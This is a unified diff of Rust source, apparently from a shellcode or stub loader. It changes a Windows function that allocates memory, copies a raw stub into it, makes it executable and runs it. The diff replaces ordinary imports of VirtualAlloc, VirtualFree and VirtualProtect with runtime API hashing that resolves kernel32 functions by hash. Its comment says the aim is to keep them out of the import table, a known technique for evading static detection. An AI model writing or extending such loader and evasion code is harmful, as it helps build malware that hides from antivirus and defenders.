@@ -323,10 +323,74 @@ fn poly_exec_raw_stub(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
 
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 fn poly_exec_raw_stub_windows(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
-    use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
-    use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
-    };
+    // Memory protection constants (kernel32/winnt).
+    const MEM_COMMIT: u32 = 0x00001000;
+    const MEM_RESERVE: u32 = 0x00002000;
+    const MEM_RELEASE: u32 = 0x00008000;
+    const PAGE_READWRITE: u32 = 0x04;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
+
+    // Resolve VirtualAlloc / VirtualFree / VirtualProtect via API hashing
+    // to avoid static IAT entries for kernel32.
+    type FnVirtualAlloc = unsafe extern "system" fn(
+        *mut std::ffi::c_void, // lpAddress
+        usize,                 // dwSize
+        u32,                   // flAllocationType
+        u32,                   // flProtect
+    ) -> *mut std::ffi::c_void;
+
+    type FnVirtualFree = unsafe extern "system" fn(
+        *mut std::ffi::c_void, // lpAddress
+        usize,                 // dwSize
+        u32,                   // dwFreeType
+    ) -> i32;
+
+    type FnVirtualProtect = unsafe extern "system" fn(
+        *mut std::ffi::c_void, // lpAddress
+        usize,                 // dwSize
+        u32,                   // flNewProtect
+        *mut u32,              // lpflOldProtect
+    ) -> i32;
+
+    static FN_VIRTUAL_ALLOC: std::sync::OnceLock<Option<FnVirtualAlloc>> =
+        std::sync::OnceLock::new();
+    static FN_VIRTUAL_FREE: std::sync::OnceLock<Option<FnVirtualFree>> =
+        std::sync::OnceLock::new();
+    static FN_VIRTUAL_PROTECT: std::sync::OnceLock<Option<FnVirtualProtect>> =
+        std::sync::OnceLock::new();
+
+    let virtual_alloc = *FN_VIRTUAL_ALLOC.get_or_init(|| unsafe {
+        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            k32,
+            pe_resolve::hash_str(b"VirtualAlloc"),
+        )?;
+        Some(std::mem::transmute::<usize, FnVirtualAlloc>(addr))
+    });
+
+    let virtual_free = *FN_VIRTUAL_FREE.get_or_init(|| unsafe {
+        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            k32,
+            pe_resolve::hash_str(b"VirtualFree"),
+        )?;
+        Some(std::mem::transmute::<usize, FnVirtualFree>(addr))
+    });
+
+    let virtual_protect = *FN_VIRTUAL_PROTECT.get_or_init(|| unsafe {
+        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            k32,
+            pe_resolve::hash_str(b"VirtualProtect"),
+        )?;
+        Some(std::mem::transmute::<usize, FnVirtualProtect>(addr))
+    });
+
+    let (virtual_alloc, virtual_free, virtual_protect) = (
+        virtual_alloc.ok_or_else(|| anyhow!("failed to resolve VirtualAlloc"))?,
+        virtual_free.ok_or_else(|| anyhow!("failed to resolve VirtualFree"))?,
+        virtual_protect.ok_or_else(|| anyhow!("failed to resolve VirtualProtect"))?,
+    );
 
     if stub.is_empty() {
         anyhow::bail!("RawStub: empty stub code");
@@ -339,7 +403,7 @@ fn poly_exec_raw_stub_windows(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
     //
     // SAFETY: standard VirtualAlloc / VirtualProtect usage with validated inputs.
     let stub_ptr: *mut u8 = unsafe {
-        let p = VirtualAlloc(
+        let p = virtual_alloc(
             std::ptr::null_mut(),
             stub.len(),
             MEM_COMMIT | MEM_RESERVE,
@@ -353,8 +417,8 @@ fn poly_exec_raw_stub_windows(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
         }
         std::ptr::copy_nonoverlapping(stub.as_ptr(), p, stub.len());
         let mut old_prot: u32 = 0;
-        if VirtualProtect(p as *mut _, stub.len(), PAGE_EXECUTE_READ, &mut old_prot) == 0 {
-            VirtualFree(p as *mut _, 0, MEM_RELEASE);
+        if virtual_protect(p as *mut _, stub.len(), PAGE_EXECUTE_READ, &mut old_prot) == 0 {
+            virtual_free(p as *mut _, 0, MEM_RELEASE);
             anyhow::bail!(
                 "VirtualProtect(PAGE_EXECUTE_READ) for stub failed: {}",
                 std::io::Error::last_os_error()
@@ -411,7 +475,7 @@ fn poly_exec_raw_stub_windows(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
     // Release the stub allocation.
     // SAFETY: stub_ptr was returned by VirtualAlloc with MEM_RELEASE semantics.
     unsafe {
-        VirtualFree(stub_ptr as *mut _, 0, MEM_RELEASE);
+        virtual_free(stub_ptr as *mut _, 0, MEM_RELEASE);
     }
 
     tracing::info!(
